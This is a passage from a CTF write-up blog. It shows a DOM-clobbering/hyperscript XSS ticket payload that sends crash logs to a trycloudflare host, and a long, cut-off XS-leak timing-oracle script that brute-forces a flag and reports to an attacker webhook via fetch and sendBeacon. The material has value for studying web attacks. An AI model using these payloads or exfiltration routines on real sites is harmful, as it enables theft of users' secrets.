+<p>The ticket payload I ended up with was this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;subject&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;c&#34;</span>,<span style="color:#e6db74">&#34;body&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;a id=\&#34;crashReportSink\&#34; name=\&#34;crashReportSink\&#34; href=\&#34;https://indicated-caution-irrigation-sail.trycloudflare.com\&#34;&gt;&lt;/a&gt;\n&lt;div _=\&#34;on load call window.flushCrashLogs()\&#34;&gt;&lt;/div&gt;\n&lt;script src=\&#34;https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.14/_hyperscript.min.js\&#34;&gt;&lt;/script&gt;&#34;</span>}
+</span></span></code></pre></div><p>This was very clever; To avoid getting blocked by the inline JS thing, it called an actual cloudflared library called <em>hyperscript</em> which allows us to but behaviour directly in an element&rsquo;s <code>_</code> attribute, which just so happens to have a <code>load</code> event. So we set our <code>&lt;a&gt;</code>&rsquo;s id and name to overwrite the <code>window.crashReportSink</code>, then trigger the function, and we get the flag!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/gobl.png#center"></p>
+<p><code>CTF{232d8f9f99d0a3e440297b4aee4774c2d2e75868c6ec85d585f8410404e56cd1}</code></p>
+<h2 id="svfgp">svfgp<a hidden class="anchor" aria-hidden="true" href="#svfgp">#</a></h2>
+<p>This one had a pretty similar look to the other challenge, demolition, with the same format, except instead of a html draft we had some notes that we can create.</p>
+<p>This one took me <em>so</em> long and <em>so so so</em> many requests that after I used up about five webhook free trial accounts, I was forced to host my own with cloudflared.</p>
+<p>Alright, so we can create notes. We have the source code, and it looks like there can also be <em>sealed</em> local notes. And the flag is written into the bot&rsquo;s localStorage, from the sealed note.</p>
+<p>There is a weird <code>mode=probe</code> thing though, that kind of looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">candidate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">q</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loadSecret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">secret</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">candidate</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">secret</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#a6e22e">candidate</span>)) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">deriveHash</span>(<span style="color:#a6e22e">secret</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">opener</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;svfgp-probe-done&#34;</span>, <span style="color:#a6e22e">sid</span>, <span style="color:#a6e22e">rid</span> }, <span style="color:#e6db74">&#34;*&#34;</span>);
+</span></span></code></pre></div><p>So if the bot tried to reach <code>/?mode=probe&amp;q=CTF{a</code> it would start trying to run that expensive hash function, which would take a whole lot longer to run. And even though the bot would be on our website, we could still get it to open our pop-ups to the svfgp website and try to access the page, and then send back a message to us with the time of each request.</p>
+<p>This type of bus is called an XS-leak or timing oracle.</p>
+<p>I tried doing this the fast way, (as fast as leaking character by character can be), but it kept getting false positives, so I had it run three tests for each character and have me manually confirm after every single one. Here is the script (ChatGPT):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">doctype</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">svfgp</span> <span style="color:#a6e22e">stable</span> <span style="color:#a6e22e">next</span><span style="color:#f92672">-</span><span style="color:#66d9ef">char</span> <span style="color:#a6e22e">probe</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/title&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/head&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">pre</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;log&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">boot</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/pre&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TARGET</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://svfgp.breakable.live/&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">WEBHOOK</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://shell-changes-anthony-answered.trycloudflare.com&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Put only the part you trust here.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">KNOWN</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f6cc2da658&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Assumption: CTF{ + 64 lowercase hex + }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">OPENING</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;CTF{&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">HASH_LEN</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">HEX</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0123456789abcdef&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Reliability knobs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">REPS</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;                  <span style="color:#75715e">// 3 is a good start
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">GAP_BETWEEN_PROBES</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">120</span>;  <span style="color:#75715e">// ms
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">SINGLE_TIMEOUT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">12000</span>;    <span style="color:#75715e">// ms
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">logEl</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;log&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">s</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">s</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">logEl</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">s</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#a6e22e">ms</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">ms</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exfilQS</span>(<span style="color:#a6e22e">params</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">usp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(<span style="color:#a6e22e">params</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WEBHOOK</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">usp</span>.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span>, {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;GET&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-store&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;omit&#39;</span>
+</span></span><span style="display:flex;"><span>    }).<span style="color:#66d9ef">catch</span>(() =&gt; {});
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">_</span>) {}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exfilJSON</span>(<span style="color:#a6e22e">obj</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">sendBeacon</span>(
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">WEBHOOK</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>)], { <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;text/plain&#39;</span> })
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">_</span>) {}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">median</span>(<span style="color:#a6e22e">arr</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> [...<span style="color:#a6e22e">arr</span>].<span style="color:#a6e22e">sort</span>((<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) =&gt; <span style="color:#a6e22e">a</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">b</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">n</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">NaN</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">n</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">s</span>[(<span style="color:#a6e22e">n</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">s</span>[<span style="color:#a6e22e">n</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#a6e22e">s</span>[<span style="color:#a6e22e">n</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>]) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">nextAlphabet</span>(<span style="color:#a6e22e">prefix</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">recoveredHex</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">prefix</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">OPENING</span>.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">recoveredHex</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">HASH_LEN</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">HEX</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">recoveredHex</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">HASH_LEN</span>) <span style="color:#66d9ef">return</span> [<span style="color:#e6db74">&#39;}&#39;</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> [];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">randId</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> Date.<span style="color:#a6e22e">now</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">singleProbe</span>(<span style="color:#a6e22e">candidatePrefix</span>, <span style="color:#a6e22e">candidateChar</span>, <span style="color:#a6e22e">repIndex</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">randId</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">rid</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">candidateChar</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">repIndex</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">sid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">TARGET</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;mode&#39;</span>, <span style="color:#e6db74">&#39;probe&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;q&#39;</span>, <span style="color:#a6e22e">candidatePrefix</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;sid&#39;</span>, <span style="color:#a6e22e">sid</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;rid&#39;</span>, <span style="color:#a6e22e">rid</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">w</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cleanup</span>() {
+</span></span><span style="display:flex;"><span>      window.<span style="color:#a6e22e">removeEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">onMessage</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> { <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">w</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">closed</span>) <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">close</span>(); } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">_</span>) {}
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">finishOk</span>(<span style="color:#a6e22e">dt</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">done</span>) <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cleanup</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">dt</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">finishErr</span>(<span style="color:#a6e22e">msg</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">done</span>) <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cleanup</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">reject</span>(<span style="color:#66d9ef">new</span> Error(<span style="color:#a6e22e">msg</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onMessage</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;https://svfgp.breakable.live&#39;</span>) <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">d</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;svfgp-probe-done&#39;</span>) <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">sid</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">sid</span>) <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">rid</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">rid</span>) <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">finishOk</span>(<span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>() <span style="color:#f92672">-</span> <span style="color:#a6e22e">start</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">onMessage</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">w</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">toString</span>(), <span style="color:#e6db74">&#39;_blank&#39;</span>, <span style="color:#e6db74">&#39;popup,width=220,height=220&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">w</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">finishErr</span>(<span style="color:#e6db74">&#39;popup blocked&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">finishErr</span>(<span style="color:#e6db74">&#39;window.open failed&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setTimeout</span>(() =&gt; <span style="color:#a6e22e">finishErr</span>(<span style="color:#e6db74">&#39;probe timeout&#39;</span>), <span style="color:#a6e22e">SINGLE_TIMEOUT</span>);
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">measureCandidate</span>(<span style="color:#a6e22e">prefix</span>, <span style="color:#a6e22e">ch</span>, <span style="color:#a6e22e">reps</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">full</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ch</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">samples</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">reps</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">dt</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">singleProbe</span>(<span style="color:#a6e22e">full</span>, <span style="color:#a6e22e">ch</span>, <span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">samples</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">dt</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">ch</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> rep</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> =&gt; </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">dt</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">1</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">ms`</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#a6e22e">GAP_BETWEEN_PROBES</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">ch</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> rep</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> ERROR </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">samples</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">SINGLE_TIMEOUT</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#a6e22e">GAP_BETWEEN_PROBES</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ch</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">samples</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">med</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">median</span>(<span style="color:#a6e22e">samples</span>)
+</span></span><span style="display:flex;"><span>  };
